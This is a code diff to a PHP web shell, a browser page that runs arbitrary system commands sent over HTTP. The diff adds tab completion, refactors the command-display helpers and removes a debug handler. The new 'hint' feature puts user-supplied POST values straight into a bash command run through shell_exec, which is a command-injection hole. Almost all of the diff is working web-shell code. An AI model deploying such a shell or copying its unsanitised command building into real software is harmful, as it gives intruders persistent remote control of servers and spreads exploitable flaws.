@@ -5,9 +5,9 @@ function featureShell($cmd, $cwd) {
 
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
         // pass
-    } elseif (preg_match("/^\s*cd\s+(.+)\s*$/", $cmd)) {
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
         chdir($cwd);
-        preg_match("/^\s*cd\s+(.+)\s*$/", $cmd, $match);
+        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         chdir($match[1]);
     } else {
         chdir($cwd);
@@ -22,6 +22,20 @@ function featureShell($cmd, $cwd) {
 
 function featurePwd() {
     return array("cwd" => getcwd());
+}
+
+function featureHint($fileName, $cwd, $type) {
+    chdir($cwd);
+    if ($type == 'cmd') {
+        $cmd = "compgen -c $fileName";
+    } else {
+        $cmd = "compgen -f $fileName";
+    }
+    $cmd = "/bin/bash -c \"$cmd\"";
+    $files = explode("\n", shell_exec($cmd));
+    return array(
+        'files' => $files,
+    );
 }
 
 if (isset($_GET["feature"])) {
@@ -39,6 +53,8 @@ if (isset($_GET["feature"])) {
         case "pwd":
             $response = featurePwd();
             break;
+        case "hint":
+            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
     }
 
     header("Content-Type: application/json");
@@ -156,20 +172,20 @@ if (isset($_GET["feature"])) {
             var eShellCmdInput = null;
             var eShellContent = null;
 
+            function _insertCommand(command) {
+                eShellContent.innerHTML += "\n\n";
+                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
+                eShellContent.innerHTML += escapeHtml(command);
+                eShellContent.innerHTML += "\n";
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _insertStdout(stdout) {
+                eShellContent.innerHTML += escapeHtml(stdout);
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
             function featureShell(command) {
-
-                function _insertCommand(command) {
-                    eShellContent.innerHTML += "\n\n";
-                    eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
-                    eShellContent.innerHTML += escapeHtml(command);
-                    eShellContent.innerHTML += "\n";
-                    eShellContent.scrollTop = eShellContent.scrollHeight;
-                }
-
-                function _insertStdout(stdout) {
-                    eShellContent.innerHTML += escapeHtml(stdout);
-                    eShellContent.scrollTop = eShellContent.scrollHeight;
-                }
 
                 _insertCommand(command);
                 makeRequest('?feature=shell', {cmd: command, cwd: CWD}, function(response) {
@@ -241,6 +257,52 @@ if (isset($_GET["feature"])) {
                             eShellCmdInput.value = commandHistory[historyPosition];
                         }
                         break;
+                    case 'Tab':
+                        event.preventDefault();
+                        var currentCmd = eShellCmdInput.value.split(' ');
+                        if (currentCmd.length > 0) {
+                            if (currentCmd.length === 1) {
+                                makeRequest(
+                                    '?feature=hint',
+                                    {
+                                        filename: currentCmd[0],
+                                        cwd: CWD,
+                                        type: 'cmd'
+                                    },
+                                    function(data) {
+                                        if (data.files.length > 1) {
+                                            if (data.files.length === 2) {
+                                                eShellCmdInput.value = data.files[0];
+                                            } else {
+                                                _insertCommand(eShellCmdInput.value);
+                                                _insertStdout(data.files.join('\n'));
+                                            }
+                                        }
+                                    }
+                                );
+                            } else {
+                                makeRequest(
+                                    '?feature=hint',
+                                    {
+                                        filename: currentCmd[currentCmd.length - 1],
+                                        cwd: CWD,
+                                        type: 'file'
+                                    },
+                                    function(data) {
+                                        if (data.files.length > 1) {
+                                            if (data.files.length === 2) {
+                                                currentCmd[currentCmd.length - 1] = data.files[0];
+                                                eShellCmdInput.value = currentCmd.join(' ');
+                                            } else {
+                                                _insertCommand(eShellCmdInput.value);
+                                                _insertStdout(data.files.join('\n'));
+                                            }
+                                        }
+                                    }
+                                );
+                            }
+                        }
+                        break;
                 }
             }
 
@@ -281,12 +343,6 @@ if (isset($_GET["feature"])) {
                 updateCwd();
                 eShellCmdInput.focus();
             };
-
-            function ondblclick1(e) {
-                console.log('on dbl click');
-                e.preventDefault();
-                e.stopPropagation();
-            }
         </script>
     </head>
 
